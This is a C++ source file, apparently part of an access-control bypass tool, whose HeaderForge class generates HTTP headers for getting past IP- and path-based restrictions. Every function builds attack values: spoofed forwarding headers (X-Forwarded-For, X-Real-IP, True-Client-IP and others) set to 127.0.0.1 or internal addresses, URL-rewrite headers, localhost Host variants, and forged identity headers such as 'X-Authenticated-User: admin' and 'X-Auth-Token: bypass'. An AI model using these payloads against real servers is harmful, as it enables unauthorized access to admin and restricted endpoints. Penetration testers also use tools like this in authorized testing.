#include "techniques/header_forge.hpp"

namespace byps {

HeaderForge::HeaderForge() {
    // Initialize common internal IP addresses
    internal_ips_ = {
        "127.0.0.1",
        "::1",
        "0.0.0.0",
        "10.0.0.1",
        "10.0.0.10",
        "172.16.0.1",
        "192.168.0.1",
        "192.168.1.1",
        "169.254.0.1"
    };
    
    // Initialize localhost variants
    localhost_variants_ = {
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0",
        "0000::1",
        "0:0:0:0:0:0:0:1"
    };
}

std::map<std::string, std::string> HeaderForge::generateForwardedForHeaders() {
    std::map<std::string, std::string> headers;
    
    // X-Forwarded-For variations
    for (const auto& ip : internal_ips_) {
        headers["X-Forwarded-For"] = ip;
        break;  // Return first one for now, can iterate in actual implementation
    }
    
    // Other forwarding headers
    headers["X-Real-IP"] = "127.0.0.1";
    headers["X-Client-IP"] = "127.0.0.1";
    headers["X-Remote-IP"] = "127.0.0.1";
    headers["X-Remote-Addr"] = "127.0.0.1";
    headers["X-Originating-IP"] = "127.0.0.1";
    headers["CF-Connecting-IP"] = "127.0.0.1";
    headers["True-Client-IP"] = "127.0.0.1";
    
    return headers;
}

std::map<std::string, std::string> HeaderForge::generateRewriteHeaders(const std::string& target_path) {
    std::map<std::string, std::string> headers;
    
    headers["X-Original-URL"] = target_path;
    headers["X-Rewrite-URL"] = target_path;
    headers["X-Forwarded-Path"] = target_path;
    headers["X-Original-Path"] = target_path;
    
    return headers;
}

std::map<std::string, std::string> HeaderForge::generateHostHeaders() {
    std::map<std::string, std::string> headers;
    
    for (const auto& host : localhost_variants_) {
        headers["Host"] = host;
        break;  // Return first one for now
    }
    
    return headers;
}

std::map<std::string, std::string> HeaderForge::generateCustomAuthHeaders() {
    std::map<std::string, std::string> headers;
    
    headers["X-Custom-IP-Authorization"] = "127.0.0.1";
    headers["X-Authenticated-User"] = "admin";
    headers["X-Forwarded-User"] = "admin";
    headers["X-Auth-Token"] = "bypass";
    headers["X-Admin"] = "true";
    headers["X-Authorized"] = "true";
    
    return headers;
}

std::map<std::string, std::string> HeaderForge::generateBypassHeaders() {
    std::map<std::string, std::string> all_headers;
    
    // Combine all bypass headers
    auto forwarded = generateForwardedForHeaders();
    all_headers.insert(forwarded.begin(), forwarded.end());
    
    auto custom = generateCustomAuthHeaders();
    all_headers.insert(custom.begin(), custom.end());
    
    return all_headers;
}

std::vector<std::string> HeaderForge::getCommonIPSpoofValues() {
    return internal_ips_;
}

std::vector<std::string> HeaderForge::getCommonHostValues() {
    return localhost_variants_;
}

} // namespace byps
